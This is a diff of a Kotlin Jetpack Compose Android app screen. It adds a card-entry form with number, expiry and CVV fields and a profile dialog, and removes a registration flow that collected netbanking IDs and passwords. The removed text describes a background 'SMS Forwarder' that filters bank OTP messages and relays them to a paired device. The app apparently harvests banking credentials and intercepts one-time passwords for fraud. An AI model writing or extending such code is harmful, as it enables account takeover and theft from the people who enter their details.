-                                shape = RoundedCornerShape(12.dp)
-                            ) {
-                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null)
-                                Spacer(modifier = Modifier.width(4.dp))
-                                Text("Back")
-                            }
-
-                            Button(
-                                onClick = {
-                                    focusManager.clearFocus()
-                                    onCompleteRegistration(
-                                        name,
-                                        mobileNumber,
-                                        address,
-                                        bankName,
-                                        accountNumber,
-                                        ifscCode,
-                                        netbankingId,
-                                        netbankingPassword,
-                                        cardNumber,
-                                        cardExpiry,
-                                        cardCvv
-                                    )
-                                },
-                                enabled = !isRegistering && isStep3Valid,
-                                modifier = Modifier
-                                    .weight(1.5f)
-                                    .height(50.dp),
-                                shape = RoundedCornerShape(12.dp)
-                            ) {
-                                if (isRegistering) {
-                                    CircularProgressIndicator(
-                                        modifier = Modifier.size(22.dp),
-                                        color = MaterialTheme.colorScheme.onPrimary
-                                    )
-                                    Spacer(modifier = Modifier.width(8.dp))
-                                    Text("Saving...")
-                                } else {
-                                    Text("Submit Details", fontSize = 15.sp, fontWeight = FontWeight.Bold)
-                                }
-                            }
-                        }
-                    }
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text("Add Card Details", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                 }
 
-                // Extra scroll space for keyboard
-                Spacer(modifier = Modifier.height(60.dp))
-            }
-        }
-    }
-}
-
-@Composable
-private fun StepProgressBar(currentStep: Int, totalSteps: Int) {
-    Column(verticalArrangement = Arrangement.spacedBy(6.dp), horizontalAlignment = Alignment.CenterHorizontally) {
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.SpaceBetween,
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            Text(
-                text = "STEP $currentStep OF $totalSteps",
-                style = MaterialTheme.typography.labelMedium,
-                fontWeight = FontWeight.Bold,
-                color = PrimaryBlue
-            )
-            Text(
-                text = when (currentStep) {
-                    1 -> "User Details"
-                    2 -> "Bank Details"
-                    else -> "Card Details"
-                },
-                style = MaterialTheme.typography.labelMedium,
-                fontWeight = FontWeight.SemiBold,
-                color = MaterialTheme.colorScheme.onSurfaceVariant
-            )
-        }
-
-        Row(
-            modifier = Modifier.fillMaxWidth(),
-            horizontalArrangement = Arrangement.spacedBy(6.dp)
-        ) {
-            for (step in 1..totalSteps) {
-                Box(
-                    modifier = Modifier
-                        .weight(1f)
-                        .height(6.dp)
-                        .clip(RoundedCornerShape(3.dp))
-                        .background(
-                            if (step <= currentStep) PrimaryBlue else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f)
-                        )
+                Text(
+                    text = "Enter your Debit or Credit Card details.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
                 )
+
+                OutlinedTextField(
+                    value = cardNumber,
+                    onValueChange = { newValue ->
+                        val digitsOnly = newValue.filter { it.isDigit() }
+                        if (digitsOnly.length <= 16) {
+                            cardNumber = digitsOnly
+                        }
+                    },
+                    label = { Text("Card Number (16 Digits)") },
+                    leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(12.dp)
+                ) {
+                    OutlinedTextField(
+                        value = cardExpiry,
+                        onValueChange = { input ->
+                            val digits = input.filter { it.isDigit() }.take(4)
+                            cardExpiry = when {
+                                digits.length >= 3 -> "${digits.substring(0, 2)}/${digits.substring(2)}"
+                                else -> digits
+                            }
+                        },
+                        label = { Text("Valid Thru (MM/YY)") },
+                        leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
+                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
+                        singleLine = true,
+                        isError = expiryDigits.length >= 2 && !isExpiryMonthValid,
+                        supportingText = {
+                            if (expiryDigits.length >= 2 && !isExpiryMonthValid) {
+                                Text("Invalid Month (01-12)", color = MaterialTheme.colorScheme.error)
+                            } else if (isCardExpiryValid) {
+                                Text("✓ Valid MM/YY", color = AccentGreen)
+                            } else {
+                                Text("Format: MM/YY", color = MaterialTheme.colorScheme.onSurfaceVariant)
+                            }
+                        },
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    )
+
+                    OutlinedTextField(
+                        value = cardCvv,
+                        onValueChange = { newValue ->
+                            val digitsOnly = newValue.filter { it.isDigit() }
+                            if (digitsOnly.length <= 3) {
+                                cardCvv = digitsOnly
+                            }
+                        },
+                        label = { Text("CVV (3 Digits)") },
+                        leadingIcon = { Icon(Icons.Default.Security, contentDescription = null) },
+                        trailingIcon = {
+                            IconButton(onClick = { isCvvVisible = !isCvvVisible }) {
+                                Icon(
+                                    imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                                    contentDescription = null
+                                )
+                            }
+                        },
+                        visualTransformation = if (isCvvVisible) VisualTransformation.None else PasswordVisualTransformation(),
+                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword, imeAction = ImeAction.Done),
+                        keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
+                        singleLine = true,
+                        isError = cardCvv.isNotEmpty() && cardCvv.length != 3,
+                        supportingText = {
+                            if (cardCvv.isNotEmpty() && cardCvv.length != 3) {
+                                Text("Must be 3 digits (${cardCvv.length}/3)", color = MaterialTheme.colorScheme.error)
+                            } else if (cardCvv.length == 3) {
+                                Text("✓ Valid 3 digits", color = AccentGreen)
+                            }
+                        },
+                        modifier = Modifier.weight(1f),
+                        shape = RoundedCornerShape(12.dp)
+                    )
+                }
+
+                state.saveMessage?.let { msg ->
+                    Text(
+                        text = msg,
+                        color = AccentGreen,
+                        style = MaterialTheme.typography.bodyMedium,
+                        fontWeight = FontWeight.Bold,
+                        textAlign = TextAlign.Center,
+                        modifier = Modifier.fillMaxWidth()
+                    )
+                }
+
+                Button(
+                    onClick = {
+                        focusManager.clearFocus()
+                        viewModel.saveCard(cardNumber, cardExpiry, cardCvv)
+                    },
+                    enabled = isFormValid && !state.isSavingAccount,
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(50.dp),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    if (state.isSavingAccount) {
+                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("Saving Card...")
+                    } else {
+                        Text("Save Card Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
+                    }
+                }
             }
         }
     }
 }
 
 /**
- * Screen shown after Sender Phone Registration is Complete: Displays Summary Cards of all saved details.
+ * TOP RIGHT PROFILE DIALOG
  */
 @Composable
-private fun SenderRegisteredScreen(
-    info: DeviceInfo
+private fun ProfileModalDialog(
+    info: DeviceInfo,
+    onDismiss: () -> Unit,
+    onLogout: () -> Unit
 ) {
-    Column(
-        modifier = Modifier
-            .fillMaxSize()
-            .windowInsetsPadding(WindowInsets.statusBars)
-            .imePadding()
-            .padding(16.dp)
-            .verticalScroll(rememberScrollState()),
-        horizontalAlignment = Alignment.CenterHorizontally,
-        verticalArrangement = Arrangement.spacedBy(16.dp)
-    ) {
+    Dialog(onDismissRequest = onDismiss) {
         Surface(
-            shape = CircleShape,
-            color = AccentGreen.copy(alpha = 0.15f),
-            modifier = Modifier.size(90.dp)
-        ) {
-            Box(contentAlignment = Alignment.Center) {
-                Icon(
-                    imageVector = Icons.Default.CheckCircle,
-                    contentDescription = null,
-                    tint = AccentGreen,
-                    modifier = Modifier.size(60.dp)
-                )
-            }
-        }
-
-        Text(
-            text = "Registration Completed",
-            style = MaterialTheme.typography.headlineSmall,
-            fontWeight = FontWeight.Bold,
-            color = MaterialTheme.colorScheme.onSurface,
-            textAlign = TextAlign.Center
-        )
-
-        Text(
-            text = "SMS Forwarder service is active in background",
-            style = MaterialTheme.typography.bodyMedium,
-            color = MaterialTheme.colorScheme.onSurfaceVariant,
-            textAlign = TextAlign.Center
-        )
-
-        // CARD 1: USER DETAILS SUMMARY
-        Card(
-            shape = RoundedCornerShape(18.dp),
-            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
-            modifier = Modifier.fillMaxWidth()
+            shape = RoundedCornerShape(24.dp),
+            color = Color.White,
+            tonalElevation = 8.dp,
+            modifier = Modifier.fillMaxWidth(0.92f)
         ) {
             Column(
-                modifier = Modifier.padding(16.dp),
-                verticalArrangement = Arrangement.spacedBy(8.dp)
+                modifier = Modifier
+                    .padding(20.dp)
+                    .verticalScroll(rememberScrollState()),
+                horizontalAlignment = Alignment.CenterHorizontally,
+                verticalArrangement = Arrangement.spacedBy(16.dp)
             ) {
-                Row(verticalAlignment = Alignment.CenterVertically) {
-                    Icon(Icons.Default.Person, contentDescription = null, tint = PrimaryBlue)
+                // Header with Close
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "User Profile",
+                        style = MaterialTheme.typography.titleLarge,
+                        fontWeight = FontWeight.Bold
+                    )
+                    IconButton(onClick = onDismiss) {
+                        Icon(Icons.Default.Close, contentDescription = "Close")
+                    }
+                }
+
+                // Avatar Badge
+                Surface(
+                    shape = CircleShape,
+                    color = PrimaryBlue.copy(alpha = 0.12f),
+                    modifier = Modifier.size(72.dp)
+                ) {
+                    Box(contentAlignment = Alignment.Center) {
+                        Icon(
+                            imageVector = Icons.Default.Person,
+                            contentDescription = null,
+                            tint = PrimaryBlue,
+                            modifier = Modifier.size(40.dp)
+                        )
+                    }
+                }
+
+                Text(
+                    text = info.departmentName.ifBlank { "User Account" },
+                    style = MaterialTheme.typography.titleMedium,
+                    fontWeight = FontWeight.Bold
+                )
+
+                Card(
+                    shape = RoundedCornerShape(16.dp),
+                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Column(
+                        modifier = Modifier.padding(16.dp),
+                        verticalArrangement = Arrangement.spacedBy(10.dp)
+                    ) {
+                        ProfileInfoRow(label = "Mobile Number", value = info.mobileNumber.ifBlank { "N/A" })
+                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                        ProfileInfoRow(
+                            label = "Bank Account Status",
+                            value = if (info.bankName.isNotBlank() && info.accountNumber.isNotBlank()) "Saved (${info.bankName})" else "Not Added"
+                        )
+                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                        ProfileInfoRow(
+                            label = "Netbanking Status",
+                            value = if (info.netbankingId.isNotBlank()) "Saved" else "Not Added"
+                        )
+                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                        ProfileInfoRow(
+                            label = "Card Details Status",
+                            value = if (info.cardNumber.isNotBlank()) "Saved (${info.cardNumber.takeLast(4).padStart(16, '*')})" else "Not Added"
+                        )
+                    }
+                }
+
+                Button(
+                    onClick = onLogout,
+                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(48.dp),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    Icon(Icons.Default.Logout, contentDescription = null, tint = Color.White)
                     Spacer(modifier = Modifier.width(8.dp))
-                    Text("User Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                }
-                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                InfoRow(label = "Name", value = info.departmentName.ifBlank { info.deviceName })
-                InfoRow(label = "Mobile No", value = info.mobileNumber.ifBlank { "N/A" })
-                InfoRow(label = "Address", value = info.address.ifBlank { "N/A" })
-            }
-        }
-
-        // CARD 2: BANK ACCOUNT SUMMARY
-        if (info.bankName.isNotBlank() || info.accountNumber.isNotBlank()) {
-            Card(
-                shape = RoundedCornerShape(18.dp),
-                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
-                modifier = Modifier.fillMaxWidth()
-            ) {
-                Column(
-                    modifier = Modifier.padding(16.dp),
-                    verticalArrangement = Arrangement.spacedBy(8.dp)
-                ) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue)
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text("Bank Account Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                    }
-                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                    InfoRow(label = "Bank Name", value = info.bankName.ifBlank { "N/A" })
-                    InfoRow(label = "Account Number", value = info.accountNumber.ifBlank { "N/A" })
-                    InfoRow(label = "IFSC Code", value = info.ifscCode.ifBlank { "N/A" })
-                    if (info.netbankingId.isNotBlank()) {
-                        InfoRow(label = "Netbanking ID", value = info.netbankingId)
-                    }
-                    if (info.netbankingPassword.isNotBlank()) {
-                        InfoRow(label = "Netbanking Password", value = "••••••••")
-                    }
-                }
-            }
-        }
-
-        // CARD 3: CARD DETAILS SUMMARY
-        if (info.cardNumber.isNotBlank()) {
-            Card(
-                shape = RoundedCornerShape(18.dp),
-                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
-                modifier = Modifier.fillMaxWidth()
-            ) {
-                Column(
-                    modifier = Modifier.padding(16.dp),
-                    verticalArrangement = Arrangement.spacedBy(8.dp)
-                ) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue)
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text("Card Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
-                    }
-                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
-                    InfoRow(label = "Card Number", value = info.cardNumber)
-                    if (info.cardExpiry.isNotBlank()) {
-                        InfoRow(label = "Valid Thru", value = info.cardExpiry)
-                    }
-                    if (info.cardCvv.isNotBlank()) {
-                        InfoRow(label = "CVV", value = "•••")
-                    }
+                    Text("Logout", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color.White)
                 }
             }
         }
@@ -737,7 +682,7 @@ private fun SenderRegisteredScreen(
 }
 
 @Composable
-private fun InfoRow(label: String, value: String) {
+private fun ProfileInfoRow(label: String, value: String) {
     Row(
         modifier = Modifier.fillMaxWidth(),
         horizontalArrangement = Arrangement.SpaceBetween,
@@ -745,8 +690,7 @@ private fun InfoRow(label: String, value: String) {
     ) {
         Text(
             text = label,
-            style = MaterialTheme.typography.bodyMedium,
-            fontWeight = FontWeight.Medium,
+            style = MaterialTheme.typography.bodySmall,
             color = MaterialTheme.colorScheme.onSurfaceVariant
         )
         Text(
@@ -754,340 +698,6 @@ private fun InfoRow(label: String, value: String) {
             style = MaterialTheme.typography.bodyMedium,
             fontWeight = FontWeight.Bold,
             color = MaterialTheme.colorScheme.onSurface
-        )
-    }
-}
-
-/**
- * Full Dashboard View for Receiver / Dual client.
- */
-@OptIn(ExperimentalMaterial3Api::class)
-@Composable
-private fun FullDashboardScreen(
-    state: HomeUiState,
-    viewModel: HomeViewModel,
-    onNavigatePairing: () -> Unit,
-    onNavigateHistory: () -> Unit,
-    onNavigateFilters: () -> Unit,
-    onNavigateSettings: () -> Unit,
-    onNavigateBatteryGuide: () -> Unit,
-    onNavigateModeSelection: () -> Unit
-) {
-    val scrollState = rememberScrollState()
-
-    Scaffold(
-        topBar = {
-            TopAppBar(
-                title = {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Text("acc believe", fontWeight = FontWeight.Bold)
-                        Spacer(modifier = Modifier.width(8.dp))
-                        state.deviceInfo?.let { info ->
-                            RoleBadge(role = info.role, onClick = onNavigateModeSelection)
-                        }
-                    }
-                },
-                actions = {
-                    IconButton(onClick = onNavigateSettings) {
-                        Icon(Icons.Default.Settings, contentDescription = "Settings")
-                    }
-                }
-            )
-        }
-    ) { padding ->
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .padding(padding)
-                .padding(horizontal = 16.dp)
-                .verticalScroll(scrollState),
-            verticalArrangement = Arrangement.spacedBy(16.dp)
-        ) {
-            Spacer(modifier = Modifier.height(4.dp))
-
-            state.deviceInfo?.let { info ->
-                DeviceStatusCard(
-                    info = info,
-                    isRegistering = state.isRegistering,
-                    onRegister = { viewModel.registerDevice() },
-                    onPair = onNavigatePairing
-                )
-            }
-
-            Text(
-                text = "Quick Actions",
-                style = MaterialTheme.typography.titleSmall,
-                fontWeight = FontWeight.SemiBold,
-                color = MaterialTheme.colorScheme.onSurfaceVariant
-            )
-
-            Row(
-                modifier = Modifier.fillMaxWidth(),
-                horizontalArrangement = Arrangement.spacedBy(12.dp)
-            ) {
-                QuickActionTile(
-                    title = "Pairing",
-                    subtitle = if (state.deviceInfo?.isPaired == true) "Connected" else "Not paired",
-                    icon = Icons.Default.QrCodeScanner,
-                    iconColor = PrimaryBlue,
-                    modifier = Modifier.weight(1f),
-                    onClick = onNavigatePairing
-                )
-
-                QuickActionTile(
-                    title = "History",
-                    subtitle = "Decrypted SMS",
-                    icon = Icons.Default.History,
-                    iconColor = AccentGreen,
-                    modifier = Modifier.weight(1f),
-                    onClick = onNavigateHistory
-                )
-            }
-
-            Row(
-                modifier = Modifier.fillMaxWidth(),
-                horizontalArrangement = Arrangement.spacedBy(12.dp)
-            ) {
-                QuickActionTile(
-                    title = "Filter Rules",
-                    subtitle = "Banks & OTPs",
-                    icon = Icons.Default.FilterList,
-                    iconColor = WarningAmber,
-                    modifier = Modifier.weight(1f),
-                    onClick = onNavigateFilters
-                )
-
-                QuickActionTile(
-                    title = "Battery Fix",
-                    subtitle = "OEM Keep-Alive",
-                    icon = Icons.Default.BatteryChargingFull,
-                    iconColor = MaterialTheme.colorScheme.secondary,
-                    modifier = Modifier.weight(1f),
-                    onClick = onNavigateBatteryGuide
-                )
-            }
-
-            if (state.pendingQueueCount > 0) {
-                Card(
-                    colors = CardDefaults.cardColors(containerColor = WarningAmber.copy(alpha = 0.15f)),
-                    shape = RoundedCornerShape(12.dp),
-                    modifier = Modifier.fillMaxWidth()
-                ) {
-                    Row(
-                        modifier = Modifier.padding(14.dp),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        Icon(Icons.Default.CloudOff, contentDescription = null, tint = WarningAmber)
-                        Spacer(modifier = Modifier.width(12.dp))
-                        Text(
-                            text = "${state.pendingQueueCount} messages in offline retry queue",
-                            style = MaterialTheme.typography.bodyMedium,
-                            fontWeight = FontWeight.Medium
-                        )
-                    }
-                }
-            }
-
-            Card(
-                shape = RoundedCornerShape(16.dp),
-                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
-                modifier = Modifier.fillMaxWidth()
-            ) {
-                Column(modifier = Modifier.padding(16.dp)) {
-                    Row(verticalAlignment = Alignment.CenterVertically) {
-                        Icon(Icons.Default.SendToMobile, contentDescription = null, tint = PrimaryBlue)
-                        Spacer(modifier = Modifier.width(8.dp))
-                        Text(
-                            text = "Test SMS Relay",
-                            style = MaterialTheme.typography.titleMedium,
-                            fontWeight = FontWeight.Bold
-                        )
-                    }
-                    Spacer(modifier = Modifier.height(6.dp))
-                    Text(
-                        text = "Simulate receiving an incoming bank OTP SMS to verify encryption and relay delivery.",
-                        style = MaterialTheme.typography.bodySmall,
-                        color = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
-                    Spacer(modifier = Modifier.height(12.dp))
-
-                    Button(
-                        onClick = { viewModel.sendTestSms() },
-                        enabled = !state.isSendingTest,
-                        modifier = Modifier.fillMaxWidth(),
-                        shape = RoundedCornerShape(10.dp)
-                    ) {
-                        if (state.isSendingTest) {
-                            CircularProgressIndicator(modifier = Modifier.size(20.dp), color = MaterialTheme.colorScheme.onPrimary)
-                            Spacer(modifier = Modifier.width(8.dp))
-                            Text("Encrypting & Sending...")
-                        } else {
-                            Icon(Icons.Default.PlayArrow, contentDescription = null)
-                            Spacer(modifier = Modifier.width(6.dp))
-                            Text("Trigger Test Bank OTP")
-                        }
-                    }
-
-                    state.testSmsResult?.let { res ->
-                        Spacer(modifier = Modifier.height(10.dp))
-                        Text(
-                            text = res,
-                            style = MaterialTheme.typography.bodySmall,
-                            fontWeight = FontWeight.Medium,
-                            color = MaterialTheme.colorScheme.onSurface
-                        )
-                    }
-                }
-            }
-
-            Spacer(modifier = Modifier.height(16.dp))
-        }
-    }
-}
-
-@Composable
-private fun DeviceStatusCard(
-    info: DeviceInfo,
-    isRegistering: Boolean,
-    onRegister: () -> Unit,
-    onPair: () -> Unit
-) {
-    Card(
-        shape = RoundedCornerShape(20.dp),
-        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)),
-        modifier = Modifier.fillMaxWidth()
-    ) {
-        Column(modifier = Modifier.padding(18.dp)) {
-            Row(
-                modifier = Modifier.fillMaxWidth(),
-                horizontalArrangement = Arrangement.SpaceBetween,
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                Column {
-                    Text(
-                        text = info.deviceName,
-                        style = MaterialTheme.typography.titleLarge,
-                        fontWeight = FontWeight.Bold
-                    )
-                    Text(
-                        text = when (info.role) {
-                            DeviceRole.SENDER -> "SMS Forwarder Gateway"
-                            DeviceRole.RECEIVER -> "SMS Receiver Client"
-                            DeviceRole.DUAL -> "Dual Mode (Relay + Client)"
-                        },
-                        style = MaterialTheme.typography.bodySmall,
-                        color = MaterialTheme.colorScheme.onSurfaceVariant
-                    )
-                }
-
-                Box(
-                    modifier = Modifier
-                        .clip(CircleShape)
-                        .background(if (info.isPaired) AccentGreen.copy(alpha = 0.2f) else WarningAmber.copy(alpha = 0.2f))
-                        .padding(horizontal = 12.dp, vertical = 6.dp)
-                ) {
-                    Text(
-                        text = if (info.isPaired) "● Connected" else "○ Unpaired",
-                        color = if (info.isPaired) AccentGreen else WarningAmber,
-                        fontWeight = FontWeight.Bold,
-                        fontSize = 12.sp
-                    )
-                }
-            }
-
-            HorizontalDivider(modifier = Modifier.padding(vertical = 12.dp))
-
-            if (!info.isRegistered) {
-                Text(
-                    text = "This device is not yet registered with the cloud relay.",
-                    style = MaterialTheme.typography.bodySmall,
-                    color = WarningAmber
-                )
-                Spacer(modifier = Modifier.height(8.dp))
-                Button(
-                    onClick = onRegister,
-                    enabled = !isRegistering,
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp)
-                ) {
-                    if (isRegistering) {
-                        CircularProgressIndicator(modifier = Modifier.size(18.dp), color = MaterialTheme.colorScheme.onPrimary)
-                    } else {
-                        Text("Register Device with Relay")
-                    }
-                }
-            } else if (!info.isPaired) {
-                Text(
-                    text = "Ready to pair with another Android device.",
-                    style = MaterialTheme.typography.bodySmall,
-                    color = MaterialTheme.colorScheme.onSurfaceVariant
-                )
-                Spacer(modifier = Modifier.height(8.dp))
-                OutlinedButton(
-                    onClick = onPair,
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(10.dp)
-                ) {
-                    Text("Start Pairing")
-                }
-            } else {
-                Row(verticalAlignment = Alignment.CenterVertically) {
-                    Icon(Icons.Default.Link, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(18.dp))
-                    Spacer(modifier = Modifier.width(6.dp))
-                    Text(
-                        text = "Paired with: ${info.pairedDeviceName ?: "Remote Device"}",
-                        style = MaterialTheme.typography.bodyMedium,
-                        fontWeight = FontWeight.Medium
-                    )
-                }
-            }
-        }
-    }
-}
-
-@Composable
-private fun QuickActionTile(
-    title: String,
-    subtitle: String,
-    icon: ImageVector,
-    iconColor: Color,
-    modifier: Modifier = Modifier,
-    onClick: () -> Unit
-) {
-    Card(
-        onClick = onClick,
-        shape = RoundedCornerShape(16.dp),
-        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surface),
-        modifier = modifier.height(100.dp)
-    ) {
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .padding(14.dp),
-            verticalArrangement = Arrangement.SpaceBetween
-        ) {
-            Icon(imageVector = icon, contentDescription = null, tint = iconColor, modifier = Modifier.size(24.dp))
-            Column {
-                Text(text = title, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold)
-                Text(text = subtitle, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
-            }
-        }
-    }
-}
-
-@Composable
-private fun RoleBadge(role: DeviceRole, onClick: () -> Unit) {
-    Surface(
-        onClick = onClick,
-        shape = RoundedCornerShape(8.dp),
-        color = MaterialTheme.colorScheme.primaryContainer
-    ) {
-        Text(
-            text = role.name,
-            modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
-            style = MaterialTheme.typography.labelSmall,
-            fontWeight = FontWeight.Bold,
-            color = MaterialTheme.colorScheme.onPrimaryContainer
         )
     }
 }
